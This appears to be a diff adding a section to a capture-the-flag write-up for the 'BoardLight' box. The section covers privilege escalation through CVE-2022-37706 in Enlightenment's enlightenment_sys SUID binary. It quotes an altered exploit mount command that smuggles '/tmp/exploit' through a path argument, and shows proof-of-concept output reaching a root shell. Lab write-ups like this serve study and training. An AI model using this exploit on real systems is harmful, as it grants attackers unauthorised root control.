@@ -466,3 +466,33 @@ bash: cannot set terminal process group (858): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ 
 ```
+
+### CVE-2022-37706-Enlightenment-0.25.3-LPE
+
+* If you see a suid binary called `enlightenment_sys`
+* [https://www.exploit-db.com/exploits/51180](https://www.exploit-db.com/exploits/51180)
+* in order to exploit, Ive had to alter the script
+
+```
+# change below 
+${file} /bin/mount -o
+noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u),
+"/dev/../tmp/;/tmp/exploit" /tmp///net
+
+# to this (no line breaks)
+${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
+```
+
+```
+./poc.sh 
+CVE-2022-37706
+[*] Trying to find the vulnerable SUID file...
+[*] This may take few seconds...
+[+] Vulnerable SUID binary found!
+[+] Trying to pop a root shell!
+[+] Welcome to the rabbit hole :)
+mount: /dev/../tmp/: can't find in /etc/fstab.
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
+# 
+```
